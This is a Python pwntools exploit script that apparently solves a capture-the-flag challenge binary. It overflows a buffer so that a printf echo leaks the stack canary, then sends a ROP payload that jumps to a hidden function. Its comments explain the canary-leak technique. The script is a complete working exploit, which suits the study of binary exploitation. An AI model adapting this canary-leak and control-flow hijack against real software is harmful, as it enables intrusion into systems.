from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = """
init-pwndbg
b *main+280
continue
""".format(**locals())

exe = "./chall"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"
context.terminal = "kitty"

io = start()
ret = ROP(elf).find_gadget(["ret"])[0]
# Leak the canary
# We must send padding until canary which is 72 - 3 (i'm string length) because strstr(buffer, "i\'m") will return the location where "i\'m" string located
# So that the printf will print the location where "i\'m" located + 4 which is after the canary NULL byte in little endian
# Then, the printf() will print anything until it found a NULL byte

io.sendline(cyclic(69) + b"i'm")
io.recvuntil(b"hi ")
canary = unpack(b"\x00" + io.recv(7))
info(f"Canary : {hex(canary)}")

payload = flat([b"i'm", cyclic(69), canary, cyclic(8), ret, elf.sym["_punk_uns"]])

io.sendline(payload)
io.sendline(b"bye")
io.interactive()
